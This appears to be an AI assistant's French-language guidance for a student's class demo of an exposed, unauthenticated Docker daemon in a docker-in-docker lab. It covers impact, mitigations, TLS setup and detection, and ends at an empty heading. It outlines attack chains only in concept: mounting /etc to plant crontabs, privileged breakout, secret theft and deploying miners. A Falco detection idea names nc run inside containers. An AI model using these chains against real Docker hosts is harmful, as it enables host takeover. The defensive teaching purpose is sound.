  - Impact : un attaquant qui atteint l’API contrôle *le daemon* et donc tous les conteneurs que ce démon gère. L’attaquant peut créer/stopper/supprimer conteneurs, manipuler images, et lire/écrire des chemins vus par ce démon → compromission des workloads gérés par ce daemon.
  - Si ce DIND n’a pas de liaison dangereuse avec l’hôte (pas de volumes host sensibles, pas de /var/lib/docker exposé, pas de privileged, pas de devices montés), l’attaque peut rester confinée au domaine du démon — toujours grave, mais confinée.
- **Cas : DIND est lancé avec privilèges ou partage des ressources hôte** (fréquent dans lab/vulhub)
  - Si le conteneur DIND est `--privileged`, ou si `/var/lib/docker` ou `/var/run/docker.sock` ou d’autres chemins/ devices de l’hôte sont montés, alors contrôler ce daemon → **prise de contrôle effective de l’hôte** possible.
  - Conclusion : l’exposition d’un dockerd sans auth est **toujours une faille** — la portée exacte (conteneur vs hôte) dépend des flags/volumes/privileges.

------

# 2) Attaques possibles (conceptuelles — pas de PoC dangereux ici)

(chaîne d’attaques types qu’il faut expliciter au prof)

1. **Création de conteneurs mal configurés**
   - conteneurs `--privileged`, conteneurs avec `cap_add`, ou binds sur `/` ou `/etc` → permettre l’écriture dans l’espace hôte ou la prise de contrôle d’autres services.
2. **Mounts de fichiers sensibles**
   - monter `/etc`, `/root`, `/var/lib/` → modifier crontabs, fichiers de config, clés, causing persistence.
3. **Persistance (concept)**
   - écrire une tâche cron / systemd unit / remplacer un binaire → persistance sur le système visible par le démon.
4. **Escalade vers l’hôte**
   - si le démon a accès aux devices ou si le conteneur DIND est privilégié, il existe des techniques de breakout qui peuvent aboutir à exécution sur l’hôte.
5. **Vol de secrets / supply-chain**
   - extraire secrets montés dans volumes, récupérer images privées, injecter images malveillantes dans des registres internes.
6. **Lateral movement & abuse**
   - démarrer conteneurs qui scannent le réseau interne, exfiltrent données, déploient mineurs, ou lancent attaques vers d’autres assets.

En pratique : même si l’impact hôte n’est pas automatique, la capacité d’un attaquant à *contrôler la plateforme de containerisation* est critique.

------

# 3) Mitigations — immédiates et durables

## Actions immédiates (à exécuter maintenant en labo/prod si vulnérable)

- **Bloquer l’accès réseau au port 2375** (surtout depuis l’extérieur) :

```bash
# bloque immédiatement (réversible)
sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT
```

- **Arrêter la stack vulnérable** si pas nécessaire :

```bash
docker compose down
```

- **Supprimer le mapping de port** dans le docker-compose (enlever `ports: - "2375:2375"`) et redéployer.

## Corrections de configuration (recommandées)

1. **Ne pas exposer dockerd sur TCP sans TLS** — par défaut utilise le socket UNIX (`/var/run/docker.sock`), pas `tcp://0.0.0.0:2375`.
2. **Si accès distant requis -> activer TLS + mutual auth** : configurer dockerd pour `--tlsverify` et fournir CA + certificats serveur/clients ; n’accepter que clients authentifiés.
3. **Ne pas lancer DIND/daemon avec `--privileged`** sauf nécessité absolue ; éviter de monter `/var/run/docker.sock` ou `/var/lib/docker` depuis l’hôte vers des conteneurs non fiables.
4. **User namespaces / rootless Docker** : limiter l’impact du root dans les conteneurs.
5. **Appliquer politiques de moindre privilège** : refuser `--cap-add`/`privileged` et contrôler Bind mounts via process d’approbation.
6. **Harden host** : AppArmor/SELinux profiles, seccomp par défaut, désactiver capabilities non nécessaires.
7. **Patch & image hygiene** : utiliser images signées, scanner images (clair, trivy), limiter registres accessibles.

## Contrôles et surveillance (détection précoce)

- Activer **Falco** pour règles types : création de conteneurs avec `Mounts` sur `/etc` ou `/` ; conteneurs lancés en `privileged` ; accès à docker.sock.
- Ingest `docker events` dans SIEM et alerter sur `create/start` de conteneurs avec host binds.
- auditd rules pour surveiller modifications de `/etc/crontabs`, `/etc/cron.*`, `/etc/passwd`, etc.
- Firewall rules et connection logs sur 2375.

------

# 4) Commandes concrètes de triage & détection (à mettre dans ta slide “Detect & Triage”)

- Vérifier écoute sur 2375 :

```bash
ss -lntp | grep 2375
```

- Interroger l’API (lecture seule) :

```bash
curl -sS http://<HOST>:2375/info | jq '.OperatingSystem, .DockerRootDir, .ServerVersion'
```

- Lister conteneurs gérés par ce daemon :

```bash
curl -sS http://<HOST>:2375/containers/json | jq .
```

- Rechercher containers démarrés avec mounts sensibles (sur l’hôte local) :

```bash
docker ps --format '{{.ID}} {{.Names}} {{.Ports}} {{.Image}}' | grep -E '2375|privileged'
# ou inspect pour chaque container
docker inspect <id> | jq '.HostConfig.Binds, .HostConfig.Privileged'
```

- Règle fail-fast auditd (exemple) :

```bash
sudo auditctl -w /etc/crontabs -p wa -k cron_mod
```

- Exemples de règle Falco (concept) : alerter si `container` writes to `/etc` or process executes `nc` inside container, etc.

------

# 5) Exemple d’actions correctives dans repo (patchs à montrer dans ta démo)

- **docker-entrypoint.sh** : supprimer `--host=tcp://0.0.0.0:2375`.
- **docker-compose.yml** : retirer `ports: - "2375:2375"` et `privileged: true`.
- Expliquer en slide : “Voici le patch minimal : retirer l’écoute TCP et l’exposition du port; si accès distant nécessaire, activer TLS + firewall.”

------

# 6) Slide & phrases prêtes pour la présentation (bref)

- Slide “Pourquoi c’est critique” :
  - `dockerd` = accès administrateur aux conteneurs et actions sur l’environnement d’exécution.
  - Exposer l’API sans auth = équivalent à donner la clef root au réseau.
- Slide “Attaques possibles (ex.)” : mount /etc → écrire crontab, start privileged container → breakout if privileged, steal secrets, run lateral scans.
- Slide “Mitigations” (3 actions clés) : 1) Bloquer 2375 / retirer mapping, 2) Activer TLS mutual auth pour docker, 3) Interdire privileged & mounts sensibles + monitoring.

------

# 7) Conclusion courte à dire à l’oral

> Même si le démon est “dans” un conteneur, l’exposition d’une API Docker non authentifiée reste critique : elle donne à un attaquant la capacité d’orchestrer des conteneurs et potentiellement d’atteindre l’hôte selon la configuration. La règle simple : **ne pas exposer dockerd sur le réseau sans authentification**.

------



 **La vraie question n’est pas « ajouter d’autres ports ? » mais « Faut-il exposer un port du tout ? »** — exposer Docker sur le réseau (2375) est dangereux. Je te propose les options pratiques et sûres + les changements concrets à appliquer dans ton `docker-compose.yml` selon ton besoin.

## Rappel rapide

- `2375` = Docker API non chiffrée / non authentifiée → **NE PAS** exposer en prod.
- Si tu dois accéder à distance au daemon, utilise soit :
  - accès sécurisé (TLS mutual auth) sur `2376`, **ou**
  - accès via SSH / docker context `ssh://`, **ou**
  - liaison locale seulement (`127.0.0.1`) et tunnel SSH, **ou**
  - privilégier le socket unix (`/var/run/docker.sock`) et outils d’orchestration.

------

## Correctifs immédiats (trois options simples — choisis une)

### Option 1 — **Ne pas exposer de port du tout** (RECOMMANDÉ pour mitigation)

Supprime complètement la section `ports` du `docker-compose.yml`. C’est le plus sûr.

```yaml
services:
  docker:
    build: .
    privileged: true
```

Ensuite :

```bash
# rebuild/redeploy
docker compose down
docker compose build
docker compose up -d
```

Vérifie : `ss -lntp | grep 2375` ne doit rien retourner.

------

### Option 2 — **Exposer seulement sur localhost** (si tu veux accès local uniquement)

Si tu veux garder l’écoute TCP mais **limiter l’accès à la machine locale** (utile pour tests), bind explicitement sur `127.0.0.1` :

```yaml
services:
  docker:
    build: .
    ports:
      - "127.0.0.1:2375:2375"
    privileged: true
```

Ensuite :

```bash
docker compose down
docker compose up -d
```

Test : depuis la même machine `curl http://127.0.0.1:2375/info` doit fonctionner, depuis une autre machine ça doit échouer.

> Remarque : lier sur localhost réduit l’attaque surface réseau, mais **ne** remplace **pas** l’auth/TLS.

------

### Option 3 — **Accès distant sécurisé (TLS)** — concept / minimal

Si un accès distant est nécessaire, configure TLS mutual auth et expose le port TLS (`2376`) **seulement** après avoir généré certificats serveur/CA/clients. C’est plus impliqué ; le compose n’est pas suffisant seul. Exemple minimal (présume que dockerd est configuré pour TLS) :

```yaml
services:
  docker:
    build: .
    ports:
      - "2376:2376"
    privileged: true
```

Mais attention : il faut configurer `dockerd` avec `--tlsverify`, `--tlscacert`, `--tlscert`, `--tlskey` et distribuer les certificats clients. Si tu veux, je peux t’écrire les grandes lignes pour générer et installer ces certificats.

------

## Sur `privileged: true`

Indépendamment du port, `privileged: true` augmente le risque d’évasion vers l’hôte. Si possible :

- Supprime `privileged: true`.
- Si nécessaire pour ton labo, documente clairement pourquoi il est requis et retire-le en prod.
- Préfère plutôt ajouter les `cap_add` / `cap_drop` précis et limiter les mounts.

Exemple pour restreindre un peu :

```yaml
services:
  docker:
    build: .
    ports:
      - "127.0.0.1:2375:2375"
    cap_add:
      - SYS_ADMIN   # si vraiment nécessaire, sinon éviter
    cap_drop:
      - ALL
```

------

## Commandes pour valider et réagir

Après modification du `docker-compose.yml` :

```bash
# valider syntaxe
docker compose config

# redeployer
docker compose down
docker compose build
docker compose up -d

# vérifier écoute
ss -lntp | grep 2375 || true
```

Si tu gardes une exposition (local ou remote), ajoute aussi un pare-feu en défense en profondeur :

```bash
# bloquer tout accès externe en attendant
sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT
```

------

## Recommandation pour ta démo / labo

- Pour ta présentation, **préfère Option 1** (supprimer `ports`) si ton but est uniquement démontrer le problème dans un environnement contrôlé et ensuite montrer la mitigation.
- Si tu dois montrer que l’API est joignable depuis la même machine, **Option 2** (127.0.0.1) est acceptable pour un test local.



## Résumé rapide

- Tu as un **daemon Docker (dockerd) tournant \*dans\* un conteneur DIND**. Ce démon écoute sur le port 2375 **à l’intérieur** du conteneur — ton PoC s’y connecte avec `http://172.18.0.2:2375` et peut créer des conteneurs qui lisent/écrivent le `/etc` vu par ce démon.
- **Actuellement il n’y a pas de port 2375 publié sur l’hôte** (donc un attaquant externe qui n’a pas d’accès sur ta machine ne peut *pas* joindre `localhost:2375`). `docker ps` montre `2375-2376/tcp` (exposé à l’intérieur) mais pas `0.0.0.0:2375->2375/tcp`.
- Si un attaquant prend le contrôle de ta machine **hôte**, il pourra évidemment utiliser Docker localement (docker CLI ou socket) et toucher le démon (host ou DIND) → **impact total**.
- La règle `iptables` que tu as ajoutée n’a d’effet que si le port est publié sur l’hôte ; elle ne protège pas le réseau interne du bridge Docker entre conteneurs.

------

## Réponses aux questions précises

### 1) « Donc il n’y a pas encore de mitigation ? »

Partiellement — tu as empêché le mapping vers l’hôte précédemment (mitigation) mais tu as encore un DIND en fonctionnement qui **permet au démon qu’il contient d’être contrôlé** depuis le réseau Docker interne (et depuis l’hôte si l’attaquant y a accès). Donc :

- **Mitigation réseau externe** : si tu n’as pas mappé 2375 sur l’hôte, les machines externes ne peuvent pas l’atteindre.
- **Mitigation inexistante côté DIND** : rien n’empêche un utilisateur qui a accès au réseau docker interne (ou au host) d’appeler l’API du démon DIND.

### 2) « Un attaquant externe peut écrire dans le conteneur ? »

- **Non** si il n’a pas accès réseau à l’hôte ni au réseau Docker : il ne peut pas joindre `172.18.0.2:2375`.
- **Oui** si :
  - l’hôte expose `2375` (mappage `HOST:CONTAINER`), ou
  - l’attaquant a compromis une autre machine/containeur sur le même réseau bridge, ou
  - l’attaquant a compromis l’hôte (alors il peut appeler Docker localement).
     Donc l’accès dépend de la **position réseau/compromission** de l’attaquant.

### 3) « Un attaquant qui prend le contrôle de ma machine hôte ? »

Oui — si l’attaquant contrôle l’hôte, il peut appeler Docker en local (socket unix ou via conteneur DIND), créer des conteneurs, monter `/etc` de l’hôte, etc. Compromission complète de l’infrastructure possible. C’est pour ça qu’on traite docker.sock et dockerd comme des ressources **hautement sensibles**.

### 4) « J’ai pas mis de port du tt. Le mapping 2375:2376 est fait automatiquement »

Non : Docker **n’expose pas automatiquement** un port hôte simplement parce qu’un conteneur écoute dedans. `2375-2376/tcp` dans `docker ps` signifie juste que le conteneur **déclare** exposer ces ports **interne**; ils ne sont pas mappés sur l’hôte sauf si tu as explicitement demandé `ports:` dans compose ou lancé `-p`.
 Si tu vois `0.0.0.0:2375->2375/tcp` alors le port est publié sur l’hôte. Sinon il reste accessible uniquement depuis le réseau Docker.

### 5) « J'avais défini une règle iptables pour bloquer le port 2375 sur l'hôte »

C’est bien en défense en profondeur, mais **inutile** tant que le port n’est pas publié sur l’hôte. Par contre si tu republies 2375 (ou si un jour il l’est automatiquement sur un autre hôte), la règle aide. Mais la vraie protection est : **ne pas exposer dockerd sur le réseau et ne pas exécuter DIND en privileged**.

------

## Mesures immédiates à exécuter maintenant (commande-ready)

Colle et exécute ces commandes sur ta machine **maintenant** pour verrouiller et vérifier l’état.

### Vérifications d’état

```bash
# IP du conteneur DIND
CID=$(docker ps -qf "name=unauthorized-rce-docker-1")
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $CID

# vérifie si l'hôte écoute sur 2375
ss -lntp | grep 2375 || echo "no host listener on 2375"

# vérifie les règles iptables
sudo iptables -L INPUT -n --line-numbers | grep 2375 || echo "no explicit iptables rule for 2375"

# inspect container : privileged? mounts?
docker inspect $CID | jq '.Name, .HostConfig.Privileged, .HostConfig.Binds, .Mounts'
```

### Mitigation rapide (safe)

```bash
# 1) arrêter et supprimer le conteneur DIND si tu veux le neutraliser
docker rm -f $CID

# 2) arrêter la stack compose si utilisée
docker compose down || docker-compose down || true

# 3) bloquer port 2375 sur l'hôte (défense en profondeur)
sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT

# 4) retirer privileged du docker-compose (editer docker-compose.yml)
# ouvre et modifie le fichier : supprime 'privileged: true' et supprime toute ligne ports 2375
```

> Si tu veux que je produise pour toi les commandes `sed` pour éditer automatiquement `docker-compose.yml` et `docker-entrypoint.sh`, je peux les générer — mais je recommande d’abord faire un backup.

### Vérifications post-actions

```bash
ss -lntp | grep 2375 || echo "host not listening on 2375 — OK"
docker ps --filter "publish=2375" --format '{{.ID}} {{.Ports}}' || echo "no published 2375"
```

------

## Hardening / mitigations longue durée (à appliquer après la démo)

1. **Ne pas utiliser DIND** sauf nécessité absolue ; éviter `privileged: true`.
2. **Ne pas exposer dockerd** sur TCP. Si vraiment nécessaire, configurer TLS mutual auth (`--tlsverify`), utiliser 2376 et autoriser uniquement clients certifiés.
3. **Ne pas monter `/var/run/docker.sock` dans des conteneurs non fiables.**
4. **User namespaces / rootless Docker** pour réduire blast radius.
5. **AppArmor/SELinux/seccomp** pour limiter capacités des conteneurs.
6. **Monitoring** : Falco + ingestion `docker events` + auditd sur `/etc`/crontabs.
7. **Processus CI/CD** : scanner les images (Trivy), signer les images, contrôler approbation de mounts.

------

## Ce que tu peux présenter en cours (phrases prêtes)

- « Ici on voit que le démon Docker est accessible **à l’intérieur** du conteneur DIND : le PoC a pu créer un fichier `PROOF_OF_POC` dans `/etc` vu par ce démon. »
- « Parce que le démon est dans un conteneur, ça limite l’impact si le DIND est isolé et non privilégié — mais si le DIND a `privileged: true` ou montages vers l’hôte, le contrôle du démon conduit à la prise de contrôle de l’hôte. »
- « Mesures immédiates : arrêter le conteneur DIND, supprimer les mappings, supprimer privileged, et ne pas exposer 2375. Mesures durables : TLS mutual auth, rootless Docker, Falco/auditd. »

------

## Vue d’ensemble (en 3 étapes)

1. Générer CA, certificat serveur (avec SAN), et certificat client (mutual TLS).
2. Configurer `dockerd` pour utiliser ces fichiers et écouter en TLS (port 2376).
3. Tester depuis le client (docker client ou curl) en exigeant l’authentification mutuelle.

------

## 1) Générer CA / certificats (exécution sur la machine qui servira de CA — peut être la même que l’hôte)

Crée un répertoire de travail et un fichier de config OpenSSL pour ajouter SAN (obligatoire pour les versions modernes) :

```bash
mkdir -p ~/docker-tls && cd ~/docker-tls
```

Crée un `openssl.cnf` minimal (ici on ajoute SAN via `subjectAltName`). Remplace `<HOST_IP>` par l'IP ou le nom DNS que les clients utiliseront pour joindre le daemon (ex: `192.168.56.101` ou `localhost` pour tests locaux).

```bash
cat > openssl.cnf <<'EOF'
[ req ]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[ req_distinguished_name ]
CN = docker-host

[ v3_req ]
keyUsage = keyEncipherment, digitalSignature
extendedKeyUsage = serverAuth, clientAuth
subjectAltName = @alt_names

[ alt_names ]
IP.1 = <HOST_IP>
DNS.1 = <HOSTNAME>
EOF
```

Remplace `<HOST_IP>` et `<HOSTNAME>` (ou supprime les lignes inutiles). Pour tests locaux tu peux mettre `127.0.0.1` et `localhost` en plus.

### 1.1 Créer CA (clé + certificat auto-signé)

```bash
# CA key
openssl genrsa -out ca-key.pem 4096

# CA cert
openssl req -x509 -new -nodes -key ca-key.pem -sha256 -days 3650 -out ca.pem \
  -subj "/CN=docker-CA"
```

### 1.2 Générer clé/CSR serveur et signer avec la CA (incluant SAN)

```bash
# serveur key
openssl genrsa -out server-key.pem 4096

# CSR with CN and SAN
openssl req -new -key server-key.pem -out server.csr -config openssl.cnf

# Sign server CSR with CA (make server cert)
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out server-cert.pem -days 365 -sha256 -extfile openssl.cnf -extensions v3_req
```

### 1.3 Générer clé/CSR client et signer (client cert used by docker client)

```bash
# client key
openssl genrsa -out key.pem 4096

# client CSR (CN can be anything identifying the client)
openssl req -new -key key.pem -out client.csr -subj "/CN=docker-client"

# Sign client cert
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out cert.pem -days 365 -sha256
```

A la fin, tu dois avoir : `ca.pem`, `ca-key.pem`, `server-cert.pem`, `server-key.pem`, `cert.pem`, `key.pem`.

**Sécurise les clés privées** :

```bash
chmod 600 ca-key.pem server-key.pem key.pem
```

------

## 2) Configurer dockerd pour TLS mutual auth

### 2.1 Option A — si tu contrôles le service dockerd (systemd)

Modifie la configuration du service systemd (exemple pour une machine hôte) : crée un fichier service override ou édite `/etc/docker/daemon.json` ou le fichier d’options systemd.

**Simple override systemd** (exemple) :

```bash
# copie des fichiers sur l'hôte
sudo mkdir -p /etc/docker/certs
sudo cp ca.pem server-cert.pem server-key.pem /etc/docker/certs/
sudo chown root:root /etc/docker/certs/* && sudo chmod 600 /etc/docker/certs/*

# créer override
sudo mkdir -p /etc/systemd/system/docker.service.d
cat > /etc/systemd/system/docker.service.d/override.conf <<'EOF'
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 \
  --tlsverify --tlscacert=/etc/docker/certs/ca.pem --tlscert=/etc/docker/certs/server-cert.pem \
  --tlskey=/etc/docker/certs/server-key.pem
EOF

# recharger systemd et redémarrer docker
sudo systemctl daemon-reload
sudo systemctl restart docker
```

> Remarque : le flag `--tlsverify` force la vérification du certificat client (mutual TLS). Le port TLS standard de docker est 2376 ; j'ai utilisé 2376 ci-dessus. Tu peux binder sur `127.0.0.1:2376` si tu veux restreindre encore plus.

### 2.2 Option B — si docker est lancé via ton `docker-entrypoint.sh` dans un conteneur (DIND)

Si tu utilises DIND (dockerd dans un conteneur), copie les certificats dans l’image/conteneur ou montez-les via un volume, puis ajoute les mêmes flags au `docker-entrypoint.sh` :

Exemple (dans ton repo) : modifier `docker-entrypoint.sh` afin d’ajouter ces options :

```sh
# supposer que /certs est monté vers le host /etc/docker/certs
set -- dockerd \
  --host=unix:///var/run/docker.sock \
  --host=tcp://0.0.0.0:2376 \
  --tlsverify \
  --tlscacert=/certs/ca.pem \
  --tlscert=/certs/server-cert.pem \
  --tlskey=/certs/server-key.pem \
  "$@"
```

Et dans `docker-compose.yml` monte les certificats en lecture seule :

```yaml
services:
  docker:
    build: .
    ports:
      - "127.0.0.1:2376:2376"
    volumes:
      - ./certs:/certs:ro
    # évite privileged si possible
```

Puis `docker compose down && docker compose up -d --build`.

------

## 3) Tester côté client

### 3.1 Méthode 1 — utiliser le binaire `docker` (client) avec `DOCKER_CERT_PATH` env

Sur la machine cliente (ou sur la même machine si tu testes localement), crée un répertoire `~/.docker-certs` et copie `ca.pem`, `cert.pem`, `key.pem` dans ce répertoire (seulement cert.pem/key.pem pour le client ; **ne** copiez `ca-key.pem` sur le client).

```bash
mkdir -p ~/.docker-certs
cp ca.pem cert.pem key.pem ~/.docker-certs/
export DOCKER_HOST="tcp://<HOST_IP>:2376"
export DOCKER_TLS_VERIFY="1"
export DOCKER_CERT_PATH="$HOME/.docker-certs"

# test
docker version
# ou
docker --tlsverify --tlscacert=$DOCKER_CERT_PATH/ca.pem \
  --tlscert=$DOCKER_CERT_PATH/cert.pem --tlskey=$DOCKER_CERT_PATH/key.pem \
  -H=tcp://<HOST_IP>:2376 version
```

Tu dois voir la version du serveur ; la connexion échouera si le client n’a pas le certificat signé par la CA.

### 3.2 Méthode 2 — tester avec `curl` (HTTPS)

`dockerd` expose une API HTTPS quand TLS activé. Exemple :

```bash
curl --cacert ca.pem --cert cert.pem --key key.pem https://<HOST_IP>:2376/version
```

Cela renverra JSON de version si tout est correct. Si tu oublies le `--cert/--key`, la requête sera refusée (client non authentifié).

------

## 4) Notes pratiques et sécurités

- **Ne jamais** distribuer `ca-key.pem` ni `server-key.pem` publiquement. `cert.pem` et `key.pem` du client doivent rester protégés.
- Choisir des durées (`-days`) appropriées et prévoir un mécanisme de renouvellement.
- Mettre `chmod 600` sur les clés privées et limiter l’accès.
- Pour multi-host, ajoute toutes les IP et DNS nécessaires dans `subjectAltName` du serveur.
- Teste d’abord en liant sur `127.0.0.1:2376` pour éviter toute exposition.
- Si tu utilises DIND, **évite `privileged: true`** ; si tu dois, sois conscient que cela augmente fortement le risque.
- Tu peux créer plusieurs certificats clients (chaque admin/unité) et révoquer un certificat en remplaçant la CA ou en utilisant une CRL si nécessaire (gestion plus avancée).

------

## 5) Exemple minimal de workflow (récapitulatif, commandes prêtes à copier)

```bash
# 1. Générer certificats (adaptation rapide)
mkdir -p ~/docker-tls && cd ~/docker-tls
# modifier openssl.cnf pour inclure IP.1 = <HOST_IP>
# generate CA
openssl genrsa -out ca-key.pem 4096
openssl req -x509 -new -nodes -key ca-key.pem -sha256 -days 3650 -out ca.pem -subj "/CN=docker-CA"
# server
openssl genrsa -out server-key.pem 4096
openssl req -new -key server-key.pem -out server.csr -config openssl.cnf
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out server-cert.pem -days 365 -sha256 -extfile openssl.cnf -extensions v3_req
# client
openssl genrsa -out key.pem 4096
openssl req -new -key key.pem -out client.csr -subj "/CN=docker-client"
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out cert.pem -days 365 -sha256

# 2. Copier sur l'hôte et configurer dockerd (systemd override)
sudo mkdir -p /etc/docker/certs
sudo cp ca.pem server-cert.pem server-key.pem /etc/docker/certs/
sudo chmod 600 /etc/docker/certs/*

# create override file as shown earlier, then:
sudo systemctl daemon-reload
sudo systemctl restart docker

# 3. On client:
mkdir -p ~/.docker-certs
cp ca.pem cert.pem key.pem ~/.docker-certs/
export DOCKER_HOST="tcp://<HOST_IP>:2376"
export DOCKER_TLS_VERIFY="1"
export DOCKER_CERT_PATH="$HOME/.docker-certs"
docker version
```

------

## 6) Alternatives / recommandations

- Pour un accès administré à distance, préfère SSH tunneling (`docker context create ssh ...`) ou `docker context` avec `ssh://` plutôt que d’exposer l’API.
- Utilise des certificats gérés par ton infra/PKI si tu en as une.
- Documente la procédure de révocation/rotation.



------

## 1) Rappel court : quel est l’objectif de ta démo ?

1. Montrer que la vulnérabilité existe (dockerd accessible → API non auth).
2. Montrer qu’on peut l’exploiter (tu as déjà écrit `PROOF_OF_POC`).
3. Montrer des mesures possibles et prouver qu’elles empêchent l’exploitation.

Tu as déjà prouvé 1 & 2. Maintenant il faut montrer 3 de façon simple et convaincante.

------

## 2) Est-ce que TLS / mutual auth est nécessaire ? (réponse simple)

- **Si tu veux autoriser un accès Docker distant légitime** (administration distante par des personnes/serveurs de confiance) → **oui**, il faut **TLS mutual auth** *ou* une méthode équivalente (SSH tunneling, VPN).
- **Si tu peux te contenter d’un accès local** : ne publie pas le port TCP du tout. Utilise le socket UNIX (`/var/run/docker.sock`) ou `docker context ssh` pour administration distante via SSH. C’est la solution la plus simple et la plus sûre dans la majorité des cas.

En une phrase : **TLS mutual auth est nécessaire seulement si tu dois autoriser des clients distants** ; sinon **ne pas exposer 2375** est la meilleure option.

------

## 3) Pourquoi TLS aide — et ses limites

- **Ce que TLS mutual auth apporte** : chiffrement + authentification forte des clients. Seuls les clients détenteurs d’un certificat signé par ta CA peuvent se connecter → empêche un attaquant réseau non autorisé d’appeler l’API.
- **Ce que TLS \*ne peut pas\* empêcher** : si l’attaquant a déjà compromis la machine *hôte*, il peut lire clés/certificats locaux, lancer commandes Docker en local, ou monter des volumes → TLS ne sauve pas un hôte compromis.
- **Conclusion pratique** : TLS protège contre les attaques réseau non autorisées ; il **ne remplace pas** les bonnes pratiques d’hygiène et la protection de l’accès hôte.

------

## 4) Options simples et recommandées (du plus simple au plus robuste)

### Option A — **Meilleure pour la démo / mitigation immédiate**

- **Ne pas exposer 2375** : supprime `ports:` ou laisse aucune liaison host:container.
- **Bloquer le port 2375 au firewall** (défense en profondeur) : `sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT`.
- **Résultat** : attaque distante directe impossible ; la démo montre que l’exploitation est bloquée.

> C’est ce que tu as déjà fait — simple, visible et pédagogique.

### Option B — **Accès distant sûr sans TLS (préférer SSH)**

- Configure les admins à utiliser **SSH** et `docker context` (ex : `docker context create myhost --docker "host=ssh://user@host"`).
- Avantage : pas besoin d’ouvrir 2375, contrôle via comptes SSH et clés.

### Option C — **TLS mutual auth (si accès distant strictement requis)**

- Générer CA, signer serveur + clients, configurer `dockerd --tlsverify --tlscacert=... --tlscert=... --tlskey=...` et exposer **2376**.
- Bind sur `127.0.0.1:2376` si tu veux limiter à l’hôte et faire tunnel SSH pour l’administrateur distant.
- Avantage : connexion chiffrée et clients authentifiés. Nécessite gestion des certificats (émission, distribution, révocation).

------

## 5) Ce que tu dois montrer en classe (processus simple et convaincant)

1. **Avant mitigation** : `curl http://<host>:2375/info` (ou `curl http://<container-IP>:2375/info`) → montre l’accès.
2. **PoC safe** : créér le `PROOF_OF_POC` (déjà fait) et montrer `cat /etc/pwned.txt`.
3. **Mitigation simple** :
   - supprimer le mapping `2375:2375` (ou binder uniquement sur `127.0.0.1`),
   - ajouter la règle iptables pour bloquer 2375.
   - **Montrer** que `curl http://localhost:2375/info` échoue (Connection refused) ou que `curl http://<container-ip>:2375` n’est plus accessible depuis une machine distante.
4. **Conclusion** : expliquer que si accès distant nécessaire, on propose TLS mutual auth (ou SSH tunnel) — expliquer rapidement pourquoi TLS est utile et ses limites (hôte compromis).

C’est suffisant pour une démo pédagogique : tu montres problème → exploitation → mitigation efficace.

------

## 6) Commandes concrètes prêtes à exécuter (copy/paste)

### A. Pour démontrer que la mitigation simple bloque l’exploitation (exécuter maintenant)

```bash
# backup docker-compose
cp docker-compose.yml docker-compose.yml.bak

# remove any explicit 2375 host mapping (manual edit or sed)
# example sed to remove exact "2375:2375" lines:
sed -i '/2375:2375/d' docker-compose.yml

# bring down and up
docker compose down
docker compose up -d --build

# add firewall rule (defense-in-depth)
sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT

# validate: should fail
curl -sS http://localhost:2375/info || echo "API not reachable on localhost:2375 — mitigation OK"
```

### B. If you must allow remote admin via SSH (recommended alternative to TLS)

```bash
# On admin machine, create an SSH docker context:
docker context create myremote --docker "host=ssh://user@remote-host"
docker context use myremote
docker ps   # will run remote docker commands over SSH
```

### C. If you insist on TLS mutual auth (outline only — I can generate scripts)

I already provided the detailed steps earlier. If you want, I generate a small `gen-certs.sh` + `override.conf` for systemd or `docker-entrypoint` patch.

------

## 7) Résumé pratique (à dire dans la présentation)

- « Bloquer le port 2375 et ne pas exposer dockerd résout immédiatement la vulnérabilité réseau. »
- « Si l’administration distante est nécessaire, préférer SSH (docker context ssh) ou configurer TLS mutual auth — mais rappeler que TLS ne protège pas un hôte déjà compromis. »
- « Défense en profondeur : firewall + removal of publish + monitoring (Falco/auditd) + least privilege. »

------



Bloquer l’accès réseau (2375) empêche les attaques **distantes**, mais **si un attaquant obtient un accès local à ta machine**, il pourra appeler l’API Docker (par le socket ou en ciblant l’IP du conteneur) et faire des opérations. Voici une réponse claire, technique et actionnable — ce que ça prouve, pourquoi c’est (parfois) attendu, et surtout **ce qu’il faut faire** pour réduire fortement ce risque.

------

## 1) Ce que ta situation prouve

- Tu as montré que l’API Docker du démon DIND est contrôlable depuis la machine hôte (ou via l’IP interne du conteneur).
- Si quelqu’un a un compte shell sur ta machine (ou la machine est compromise), il peut exécuter un script `poc.py` et contrôler Docker.
- **Conclusion** : bloquer le port réseau n’empêche pas un attaquant local. C’est une limite normale — Docker est conçu pour être contrôlé par des utilisateurs « privilégiés » du système.

------

## 2) Est-ce légitime / attendu que l’on puisse faire ça depuis la machine hôte ?

- Oui et non :
  - **Oui** : Docker expose son API via le socket UNIX `/var/run/docker.sock` (ou via TCP si configuré). Par design, la possession d’un accès root (ou d’un compte dans le groupe `docker`) permet de contrôler Docker. C’est la raison pour laquelle le groupe `docker` équivaut à des privilèges d’administration.
  - **Non souhaitable** : on **ne veut pas** que des comptes non-administrateurs ou des processus user-space non autorisés aient ce pouvoir. Donc la responsabilité est de **restreindre** qui peut appeler Docker localement.

------

## 3) Principes de sécurité à appliquer (haute priorité)

1. **Limiter l’accès local à Docker** — retirer les utilisateurs non administrateurs du groupe `docker`.
2. **Restreindre l’accès au socket `/var/run/docker.sock`** (permissions/ACL) — ne laisser que root ou administrateurs.
3. **Ne pas exécuter DIND / containers en `--privileged`** sauf nécessité absolue.
4. **Eviter/contrôler les bind-mounts sensibles** (`/etc`, `/var/lib/docker`, `/`) ; interdire les mounts automatiques.
5. **Utiliser rootless Docker ou user namespaces** pour réduire l’impact d’un conteneur compromis.
6. **Monitoring & audit** : Falco, auditd, journaux pour détecter activités Docker suspectes.
7. **Défense en profondeur** : firewall + TLS pour accès distant + gestion des utilisateurs.

------

## 4) Commandes concrètes à exécuter maintenant (bloquantes et simples)

